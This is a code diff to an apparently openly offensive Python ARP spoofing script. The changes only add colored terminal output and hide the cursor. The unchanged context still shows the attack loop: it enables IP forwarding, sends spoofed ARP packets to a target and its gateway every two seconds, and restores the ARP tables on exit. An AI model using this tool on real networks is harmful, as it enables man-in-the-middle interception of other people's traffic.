@@ -5,6 +5,8 @@ import subprocess
 import optparse
 import time
 import sys
+import os
+from termcolor import colored, cprint
 
 
 def get_arguments():
@@ -13,9 +15,9 @@ def get_arguments():
     parser.add_option("-g", "--gateway", dest="gateway_ip", help="Set gateway/router ip.")
     (options, arguments) = parser.parse_args()
     if not options.target_ip:
-        parser.error("[-] Please specify a target ip, use --help for more information.")
+        parser.error(colored("[-] Please specify a target ip, use --help for more information.", 'red'))
     elif not options.gateway_ip:
-        parser.error("[-] Please specify a gateway/router ip, use --help for more information.")
+        parser.error(colored("[-] Please specify a gateway/router ip, use --help for more information.", 'red'))
     return options
 
 
@@ -54,16 +56,17 @@ subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
 
 try:
     sent_packets_count = 0
-    print("Use CTRL + C to quit application.")
+    print(colored("Use CTRL + C to quit application.", 'blue', 'on_white'))
     while True:
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
         sent_packets_count = sent_packets_count + 2
-        print("\r[+] Packets sent: " + str(sent_packets_count)),
+        os.system('setterm -cursor off')
+        print(colored("\r[+] Packets sent: ", 'green') + colored(str(sent_packets_count), 'green')),
         sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
-    print("\n[+] Detected CTRL + C ... Resetting ARP table, please wait.\n")
+    print(colored("\n[+] Detected CTRL + C ... Resetting ARP table, please wait.\n", 'green'))
     restore(target_ip, gateway_ip)
     restore(gateway_ip, target_ip)
-    print("The ARP table has been restored. Exiting...")
+    cprint("The ARP table has been restored. Exiting...", 'blue', 'on_white')
